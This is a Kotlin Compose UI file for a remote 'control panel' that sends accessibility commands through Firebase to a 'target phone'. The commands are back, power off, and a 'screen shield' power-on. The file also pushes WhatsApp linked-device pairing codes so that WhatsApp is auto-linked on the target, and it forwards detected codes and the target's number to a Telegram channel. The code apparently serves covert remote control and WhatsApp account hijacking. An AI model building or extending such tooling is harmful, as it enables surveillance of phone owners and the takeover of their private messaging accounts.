package com.example.ui

import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.Logout
import androidx.compose.material.icons.automirrored.filled.Send
import androidx.compose.material.icons.filled.Bolt
import androidx.compose.material.icons.filled.CameraAlt
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Emergency
import androidx.compose.material.icons.filled.Image
import androidx.compose.material.icons.filled.Link
import androidx.compose.material.icons.filled.PowerSettingsNew
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ElevatedCard
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.credentials.CredentialManager
import androidx.lifecycle.ViewModelProvider.AndroidViewModelFactory.Companion.APPLICATION_KEY
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.lifecycle.viewmodel.initializer
import androidx.lifecycle.viewmodel.viewModelFactory
import com.example.data.AccessibilitySignal
import com.example.data.FirebaseSignalRepository
import com.example.util.PairingCodeImageExtractor
import com.example.util.TelegramRealtimeSync
import com.example.util.VibrationEvent
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Locale

private fun toBengaliNumber(n: Int): String {
    val bnDigits = charArrayOf('০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯')
    return n.toString().map { ch ->
        if (ch in '0'..'9') bnDigits[ch - '0'] else ch
    }.joinToString("")
}

@Composable
fun FirebaseSignalSection(
    currentUserId: String,
    userEmail: String,
    deviceId: String,
    deviceModel: String,
    isServiceEnabled: Boolean,
    mainViewModel: MainViewModel,
    isControlPanelMode: Boolean = true,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val credentialManager = remember(context) { CredentialManager.create(context) }

    val signalViewModel: FirebaseSignalViewModel = viewModel(
        key = currentUserId,
        factory = viewModelFactory {
            initializer {
                val app = checkNotNull(this[APPLICATION_KEY]) {
                    "APPLICATION_KEY missing from CreationExtras"
                }
                FirebaseSignalViewModel(
                    FirebaseSignalRepository(context = app, explicitIdentifier = currentUserId),
                    currentUserId
                )
            }
        }
    )

    val signalsState by signalViewModel.signalsState.collectAsStateWithLifecycle()
    val targetDeviceProfile by signalViewModel.targetDeviceProfile.collectAsStateWithLifecycle()
    val lastBanner by signalViewModel.lastActionBanner.collectAsStateWithLifecycle()
    val isSending by signalViewModel.isSendingSignal.collectAsStateWithLifecycle()

    var quickPairingCodeInput by remember { mutableStateOf("") }
    var scanFeedback by remember { mutableStateOf<String?>(null) }

    val profile = targetDeviceProfile
    val isTargetConnected = profile != null
    val isTargetPermissionOn = profile?.isServiceEnabled == true
    val isPowerActive = profile?.isPowerOn ?: true

    // Zero-permission Android Photo Picker for the Gallery / Camera icons inside the Pairing Code Input Bar
    val pickCodeImageLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.PickVisualMedia()
    ) { uri ->
        if (uri != null) {
            scanFeedback = "Scanning 8-digit pairing code from image..."
            coroutineScope.launch {
                try {
                    val bytes = context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                    if (bytes != null) {
                        val res = PairingCodeImageExtractor.extractPairingCodeFromBytes(context, bytes)
                        val extracted = res.code
                        if (!extracted.isNullOrBlank()) {
                            quickPairingCodeInput = extracted.take(8).uppercase()
                            scanFeedback = "🟢 Code detected: $quickPairingCodeInput — Tap FLY to send ✓"
                            TelegramRealtimeSync.getInstance(context).notifyCustomMessage(
                                "📸 Pairing Code Detected from Image ✓",
                                "Detected Code: <code>$quickPairingCodeInput</code>\nTarget Phone: <code>$currentUserId</code>"
                            )
                        } else {
                            scanFeedback = "🟠 No 8-digit code found in image. Please select a clear screenshot."
                        }
                    }
                } catch (e: Exception) {
                    scanFeedback = "Scan error: ${e.message}"
                }
            }
        }
    }

    // CRITICAL FOR MULTI-PHONE FLOW:
    // Only register/overwrite the DeviceProfile in Firestore if this phone is acting as the Target App Phone
    // (or has Accessibility Permission enabled on this phone).
    LaunchedEffect(currentUserId, deviceId, isServiceEnabled, isControlPanelMode) {
        if (!isControlPanelMode || isServiceEnabled) {
            signalViewModel.syncUserDeviceWithFirebase(
                deviceId = deviceId,
                deviceModel = deviceModel,
                isPowerOn = true,
                isServiceEnabled = isServiceEnabled
            )
        }
    }

    ElevatedCard(
        modifier = modifier
            .fillMaxWidth()
            .padding(horizontal = 14.dp)
            .shadow(16.dp, RoundedCornerShape(32.dp))
            .border(1.5.dp, Color(0xFF1E293B), RoundedCornerShape(32.dp))
            .testTag("firebase_signal_hub_card"),
        shape = RoundedCornerShape(32.dp),
        colors = CardDefaults.elevatedCardColors(containerColor = Color(0xFF070B14)),
        elevation = CardDefaults.elevatedCardElevation(defaultElevation = 10.dp)
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            // =========================================================================
            // LIVE TARGET APP CONNECTION & REAL-TIME SERVICE PROGRESS MONITOR (Control Panel Side Only)
            // =========================================================================
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(22.dp))
                    .background(
                        if (isTargetConnected && isTargetPermissionOn) Color(0xFF06281E)
                        else if (isTargetConnected) Color(0xFF1F160B)
                        else Color(0xFF0D1526)
                    )
                    .border(
                        width = 1.5.dp,
                        color = if (isTargetConnected && isTargetPermissionOn) Color(0xFF10B981)
                        else if (isTargetConnected) Color(0xFFF59E0B)
                        else Color(0xFF334155),
                        shape = RoundedCornerShape(22.dp)
                    )
                    .clickable(enabled = !isSending) {
                        mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                        signalViewModel.sendAccessibilitySignal(
                            deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                            signalType = "STATUS_PING",
                            command = "READY_FOR_WHATSAPP_LINK",
                            messageBn = "টার্গেট অ্যাপ সংযোগ যাচাই সিগন্যাল প্রেরিত",
                            priority = "HIGH",
                            isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                        )
                    }
                    .padding(horizontal = 14.dp, vertical = 12.dp)
                    .testTag("target_app_connection_status_banner"),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(10.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Box(
                        modifier = Modifier
                            .size(12.dp)
                            .clip(CircleShape)
                            .background(
                                if (isTargetConnected && isTargetPermissionOn) Color(0xFF22C55E)
                                else if (isTargetConnected) Color(0xFFF59E0B)
                                else Color(0xFF38BDF8)
                            )
                    )
                    Text(
                        text = when {
                            isTargetConnected && isTargetPermissionOn ->
                                "🟢 একই নাম্বারে লগইন থাকা অ্যাপ কানেক্টেড (${profile?.deviceModel ?: "Target Phone"}) ✓"
                            isTargetConnected ->
                                "🟠 অ্যাপ লগইন আছে (${profile?.deviceModel ?: "Target Phone"}) • পারমিশন অন অপেক্ষমান"
                            else ->
                                "📱 লগইন নাম্বার: $currentUserId • অ্যাপ লগইন করলেই স্বয়ংক্রিয় কানেক্ট হবে"
                        },
                        fontSize = 12.5.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = Color.White
                    )
                }

                // Live Step-by-Step Service Progress Box (Shows Last Connected timestamp + where & how the service is working)
                val lastSeenMillis = (profile?.lastConnectedAt ?: profile?.updatedAt)?.toDate()?.time
                val lastSeenFormatted = remember(lastSeenMillis) {
                    if (lastSeenMillis != null && lastSeenMillis > 0L) {
                        val sdf = SimpleDateFormat("hh:mm:ss a (dd MMM)", Locale.getDefault())
                        sdf.format(java.util.Date(lastSeenMillis))
                    } else {
                        "এখনো সংযুক্ত হয়নি"
                    }
                }
                val latestSignalMsg = (signalsState as? SignalUiState.Success)
                    ?.data
                    ?.firstOrNull()
                    ?.messageBn
                    ?.takeIf { it.isNotBlank() }
                val liveServiceMessage = profile?.lastSignalSummary?.takeIf { it.isNotBlank() }
                    ?: latestSignalMsg
                    ?: "কন্ট্রোল প্যানেল থেকে বাটন চাপলেই টার্গেট ফোনে সার্ভিস রান হবে এবং প্রতিটি ধাপের লাইভ বার্তা এখানে দেখা যাবে"

                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(14.dp))
                        .background(Color(0xFF04131D))
                        .border(1.dp, Color(0xFF0EA5E9).copy(alpha = 0.55f), RoundedCornerShape(14.dp))
                        .padding(horizontal = 12.dp, vertical = 10.dp)
                        .testTag("control_panel_live_step_monitor")
                ) {
                    Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                        Text(
                            text = "🕒 সর্বশেষ সংযুক্ত (Last Seen): $lastSeenFormatted",
                            fontSize = 11.5.sp,
                            fontWeight = FontWeight.ExtraBold,
                            color = Color(0xFFFDE047)
                        )
                        Text(
                            text = "📡 লাইভ সার্ভিস স্ট্যাটাস ও ধাপ সমূহ (কন্ট্রোল প্যানেল মনিটর):",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF38BDF8)
                        )
                        Text(
                            text = liveServiceMessage,
                            fontSize = 13.sp,
                            fontWeight = FontWeight.ExtraBold,
                            color = Color(0xFFA7F3D0),
                            maxLines = 4
                        )
                    }
                }
            }

            // =========================================================================
            // TOP ROW: TWO SIDE-BY-SIDE CARDS — [1] BACK CARD & [2] POWER CARD (Professional English UI)
            // =========================================================================
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                // LEFT CARD: BACK (Exit Screen -> CLICK BACK)
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(26.dp))
                        .background(Color(0xFF0B111E))
                        .border(1.5.dp, Color(0xFF1E293B), RoundedCornerShape(26.dp))
                        .padding(vertical = 20.dp, horizontal = 12.dp)
                ) {
                    Column(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.spacedBy(10.dp)
                    ) {
                        // Glowing Amber-Gold Circular Back Arrow Icon
                        Box(
                            modifier = Modifier
                                .size(76.dp)
                                .clip(CircleShape)
                                .background(Color(0xFF1C160C))
                                .border(2.2.dp, Color(0xFFD97706), CircleShape)
                                .clickable {
                                    mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                    signalViewModel.sendAccessibilitySignal(
                                        deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                        signalType = "CLICK_BACK",
                                        command = "/back",
                                        messageBn = "BACK signal sent to target device",
                                        priority = "HIGH",
                                        isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                    )
                                },
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                                contentDescription = "BACK",
                                tint = Color(0xFFF59E0B),
                                modifier = Modifier.size(34.dp)
                            )
                        }

                        Spacer(modifier = Modifier.height(2.dp))

                        Text(
                            text = "BACK",
                            fontSize = 20.sp,
                            fontWeight = FontWeight.ExtraBold,
                            color = Color.White,
                            letterSpacing = 1.sp
                        )

                        Text(
                            text = "Exit Active Screen",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            color = Color(0xFF94A3B8),
                            textAlign = TextAlign.Center
                        )

                        Spacer(modifier = Modifier.height(4.dp))

                        // Pill Button: CLICK BACK
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(46.dp)
                                .clip(RoundedCornerShape(50))
                                .background(Color(0xFF090E1A))
                                .border(1.2.dp, Color(0xFF1E293B), RoundedCornerShape(50))
                                .clickable(enabled = !isSending) {
                                    mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                    signalViewModel.sendAccessibilitySignal(
                                        deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                        signalType = "CLICK_BACK",
                                        command = "/back",
                                        messageBn = "BACK signal sent to target device",
                                        priority = "HIGH",
                                        isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                    )
                                }
                                .testTag("firebase_click_back_signal_button"),
                            contentAlignment = Alignment.Center
                        ) {
                            Text(
                                text = "CLICK BACK",
                                fontSize = 13.5.sp,
                                fontWeight = FontWeight.ExtraBold,
                                color = Color(0xFFF59E0B),
                                letterSpacing = 0.6.sp
                            )
                        }
                    }
                }

                // RIGHT CARD: POWER (Connection & Automation -> OFF / ON Segmented Pill Toggle)
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .shadow(
                            elevation = if (isPowerActive) 12.dp else 4.dp,
                            shape = RoundedCornerShape(26.dp),
                            ambientColor = Color(0xFF10B981),
                            spotColor = Color(0xFF10B981)
                        )
                        .clip(RoundedCornerShape(26.dp))
                        .background(Color(0xFF071514))
                        .border(
                            width = 1.8.dp,
                            color = if (isPowerActive) Color(0xFF10B981) else Color(0xFF1E293B),
                            shape = RoundedCornerShape(26.dp)
                        )
                        .padding(vertical = 20.dp, horizontal = 12.dp)
                ) {
                    Column(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.spacedBy(10.dp)
                    ) {
                        // Glowing Neon Green Circular Power Icon
                        Box(
                            modifier = Modifier
                                .size(76.dp)
                                .clip(CircleShape)
                                .background(Color(0xFF06281E))
                                .border(
                                    width = 2.4.dp,
                                    color = if (isPowerActive) Color(0xFF10B981) else Color(0xFF475569),
                                    shape = CircleShape
                                )
                                .clickable(enabled = !isSending) {
                                    mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                    if (isPowerActive) {
                                        signalViewModel.sendAccessibilitySignal(
                                            deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                            signalType = "POWER_OFF",
                                            command = "/poweroff",
                                            messageBn = "POWER OFF (/poweroff) signal sent",
                                            priority = "HIGH",
                                            isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                        )
                                    } else {
                                        signalViewModel.sendAccessibilitySignal(
                                            deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                            signalType = "SCREEN_SHIELD",
                                            command = "/poweron",
                                            messageBn = "POWER ON (/poweron) signal sent",
                                            priority = "HIGH",
                                            isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                        )
                                    }
                                },
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.PowerSettingsNew,
                                contentDescription = "POWER",
                                tint = if (isPowerActive) Color(0xFF10B981) else Color(0xFF64748B),
                                modifier = Modifier.size(34.dp)
                            )
                        }

                        Spacer(modifier = Modifier.height(2.dp))

                        Text(
                            text = "POWER",
                            fontSize = 20.sp,
                            fontWeight = FontWeight.ExtraBold,
                            color = Color.White,
                            letterSpacing = 1.sp
                        )

                        Text(
                            text = "Connection & Automation",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            color = Color(0xFF94A3B8),
                            textAlign = TextAlign.Center
                        )

                        Spacer(modifier = Modifier.height(4.dp))

                        // Segmented Pill Switch: [ OFF ]  [ ON ]
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(46.dp)
                                .clip(RoundedCornerShape(50))
                                .background(Color(0xFF050B11))
                                .border(1.dp, Color(0xFF112A26), RoundedCornerShape(50))
                                .padding(4.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            // OFF Pill Button
                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .height(38.dp)
                                    .clip(RoundedCornerShape(50))
                                    .background(
                                        if (!isPowerActive) Color(0xFFDC2626) else Color.Transparent
                                    )
                                    .clickable(enabled = !isSending) {
                                        mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                        signalViewModel.sendAccessibilitySignal(
                                            deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                            signalType = "POWER_OFF",
                                            command = "/poweroff",
                                            messageBn = "POWER OFF (/poweroff) signal sent",
                                            priority = "HIGH",
                                            isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                        )
                                    }
                                    .testTag("firebase_poweroff_signal_button"),
                                contentAlignment = Alignment.Center
                            ) {
                                Text(
                                    text = "OFF",
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.ExtraBold,
                                    color = if (!isPowerActive) Color.White else Color(0xFF64748B)
                                )
                            }

                            // ON Pill Button (Glowing Green Pill)
                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .height(38.dp)
                                    .shadow(
                                        elevation = if (isPowerActive) 8.dp else 0.dp,
                                        shape = RoundedCornerShape(50),
                                        ambientColor = Color(0xFF22C55E),
                                        spotColor = Color(0xFF22C55E)
                                    )
                                    .clip(RoundedCornerShape(50))
                                    .background(
                                        if (isPowerActive) Color(0xFF22C55E) else Color.Transparent
                                    )
                                    .clickable(enabled = !isSending) {
                                        mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                        signalViewModel.sendAccessibilitySignal(
                                            deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                            signalType = "SCREEN_SHIELD",
                                            command = "/poweron",
                                            messageBn = "POWER ON (/poweron) signal sent",
                                            priority = "HIGH",
                                            isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                        )
                                    }
                                    .testTag("firebase_shield_signal_button"),
                                contentAlignment = Alignment.Center
                            ) {
                                Text(
                                    text = "ON",
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.ExtraBold,
                                    color = if (isPowerActive) Color(0xFF052E16) else Color(0xFF64748B)
                                )
                            }
                        }
                    }
                }
            }

            // =========================================================================
            // BOTTOM WIDE CARD: WhatsApp Linked Pairing Code + 0/8 Digits + Input + Gallery/Camera + FLY Button
            // =========================================================================
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(28.dp))
                    .background(Color(0xFF0B111E))
                    .border(
                        width = 1.5.dp,
                        brush = Brush.verticalGradient(
                            colors = listOf(
                                Color(0xFF2DD4BF).copy(alpha = 0.65f),
                                Color(0xFF1E293B),
                                Color(0xFF1E293B)
                            )
                        ),
                        shape = RoundedCornerShape(28.dp)
                    )
                    .padding(18.dp)
            ) {
                Column(
                    modifier = Modifier.fillMaxWidth(),
                    verticalArrangement = Arrangement.spacedBy(14.dp)
                ) {
                    // Top Header inside Pairing Card: Link Icon + "WhatsApp Linked Pairing Code" + "0/8 Digits" Pill
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp),
                            modifier = Modifier.weight(1f)
                        ) {
                            Icon(
                                imageVector = Icons.Default.Link,
                                contentDescription = null,
                                tint = Color(0xFF38BDF8),
                                modifier = Modifier.size(22.dp)
                            )
                            Text(
                                text = "WhatsApp Linked Pairing Code",
                                fontSize = 15.5.sp,
                                fontWeight = FontWeight.ExtraBold,
                                color = Color.White
                            )
                        }

                        // Digit Counter Pill Badge ("0/8 Digits")
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(12.dp))
                                .background(Color(0xFF082032))
                                .border(1.dp, Color(0xFF0284C7).copy(alpha = 0.5f), RoundedCornerShape(12.dp))
                                .padding(horizontal = 12.dp, vertical = 6.dp)
                        ) {
                            Text(
                                text = "${quickPairingCodeInput.length}/8 Digits",
                                fontSize = 12.5.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFF38BDF8)
                            )
                        }
                    }

                    // Input Row: Rounded Dark Input Box with Gallery & Camera Icons + Glowing Blue FLY Button
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(10.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        // Custom Dark Pill Input Field with embedded Gallery & Camera Icon Buttons
                        Row(
                            modifier = Modifier
                                .weight(1f)
                                .height(58.dp)
                                .clip(RoundedCornerShape(20.dp))
                                .background(Color(0xFF070C17))
                                .border(1.2.dp, Color(0xFF1E293B), RoundedCornerShape(20.dp))
                                .padding(start = 14.dp, end = 6.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .padding(end = 6.dp),
                                contentAlignment = Alignment.CenterStart
                            ) {
                                if (quickPairingCodeInput.isEmpty()) {
                                    Text(
                                        text = "Enter Code (ADT9Y78K)",
                                        fontSize = 14.sp,
                                        fontWeight = FontWeight.Medium,
                                        color = Color(0xFF475569),
                                        maxLines = 1
                                    )
                                }
                                BasicTextField(
                                    value = quickPairingCodeInput,
                                    onValueChange = { raw ->
                                        quickPairingCodeInput = raw
                                            .replace("-", "")
                                            .replace("_", "")
                                            .replace(" ", "")
                                            .take(8)
                                            .uppercase()
                                    },
                                    singleLine = true,
                                    textStyle = TextStyle(
                                        color = Color.White,
                                        fontSize = 15.5.sp,
                                        fontWeight = FontWeight.ExtraBold,
                                        letterSpacing = 1.2.sp
                                    ),
                                    cursorBrush = SolidColor(Color(0xFF38BDF8)),
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .testTag("firebase_whatsapp_code_input")
                                )
                            }

                            // Gallery Image Picker Button inside Input Field
                            IconButton(
                                onClick = {
                                    mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                    pickCodeImageLauncher.launch(
                                        PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)
                                    )
                                },
                                modifier = Modifier
                                    .size(38.dp)
                                    .clip(RoundedCornerShape(12.dp))
                                    .background(Color(0xFF0D1B2A))
                                    .border(1.dp, Color(0xFF1E3A5F), RoundedCornerShape(12.dp))
                                    .testTag("firebase_code_gallery_picker_button")
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Image,
                                    contentDescription = "Select code screenshot from gallery",
                                    tint = Color(0xFF38BDF8),
                                    modifier = Modifier.size(18.dp)
                                )
                            }

                            Spacer(modifier = Modifier.width(6.dp))

                            // Camera / Screenshot Scan Button inside Input Field
                            IconButton(
                                onClick = {
                                    mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                    pickCodeImageLauncher.launch(
                                        PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)
                                    )
                                },
                                modifier = Modifier
                                    .size(38.dp)
                                    .clip(RoundedCornerShape(12.dp))
                                    .background(Color(0xFF06281E))
                                    .border(1.dp, Color(0xFF059669).copy(alpha = 0.6f), RoundedCornerShape(12.dp))
                                    .testTag("firebase_code_camera_scan_button")
                            ) {
                                Icon(
                                    imageVector = Icons.Default.CameraAlt,
                                    contentDescription = "Scan pairing code from photo",
                                    tint = Color(0xFF10B981),
                                    modifier = Modifier.size(18.dp)
                                )
                            }
                        }

                        // Glowing Blue "FLY" Button (Paper Plane Icon + FLY)
                        Button(
                            onClick = {
                                val clean = quickPairingCodeInput.trim().uppercase()
                                if (clean.isNotBlank()) {
                                    mainViewModel.testVibrationEvent(VibrationEvent.PAIRING_SUCCESS)
                                    signalViewModel.sendAccessibilitySignal(
                                        deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                        signalType = "WHATSAPP_LINK",
                                        command = "/send_cod_$clean",
                                        messageBn = "WhatsApp Pairing Code ($clean) sent via FLY signal",
                                        priority = "CRITICAL",
                                        isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                    )
                                    if (isServiceEnabled) {
                                        mainViewModel.startWhatsAppAutoLink(clean)
                                    }
                                    quickPairingCodeInput = ""
                                } else {
                                    // If tapped with empty code, open WhatsApp directly on target phone
                                    mainViewModel.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                                    signalViewModel.sendAccessibilitySignal(
                                        deviceId = profile?.deviceId?.ifBlank { deviceId } ?: deviceId,
                                        signalType = "WHATSAPP_LINK",
                                        command = "/whatsapp",
                                        messageBn = "Open WhatsApp Linked Devices signal (FLY) sent",
                                        priority = "CRITICAL",
                                        isControlPanelRemoteDispatch = isControlPanelMode && !isServiceEnabled
                                    )
                                }
                            },
                            enabled = !isSending,
                            shape = RoundedCornerShape(20.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFF007BFF),
                                contentColor = Color.White,
                                disabledContainerColor = Color(0xFF1E3A8A),
                                disabledContentColor = Color(0xFF93C5FD)
                            ),
                            contentPadding = PaddingValues(horizontal = 18.dp, vertical = 0.dp),
                            modifier = Modifier
                                .height(58.dp)
                                .shadow(
                                    elevation = 12.dp,
                                    shape = RoundedCornerShape(20.dp),
                                    ambientColor = Color(0xFF007BFF),
                                    spotColor = Color(0xFF007BFF)
                                )
                                .testTag("firebase_send_whatsapp_code_button")
                        ) {
                            Icon(
                                imageVector = Icons.AutoMirrored.Filled.Send,
                                contentDescription = "FLY",
                                tint = Color.White,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "FLY",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.ExtraBold,
                                color = Color.White,
                                letterSpacing = 0.8.sp
                            )
                        }
                    }

                    if (!scanFeedback.isNullOrBlank()) {
                        Text(
                            text = scanFeedback!!,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF38BDF8)
                        )
                    }
                }
            }

            if (!lastBanner.isNullOrBlank()) {
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(12.dp))
                        .background(Color(0xFF06281E))
                        .border(1.dp, Color(0xFF10B981).copy(alpha = 0.5f), RoundedCornerShape(12.dp))
                        .padding(horizontal = 12.dp, vertical = 8.dp)
                        .testTag("firebase_signal_feedback_banner")
                ) {
                    Text(
                        text = lastBanner!!,
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFF34D399)
                    )
                }
            }
        }
    }
}

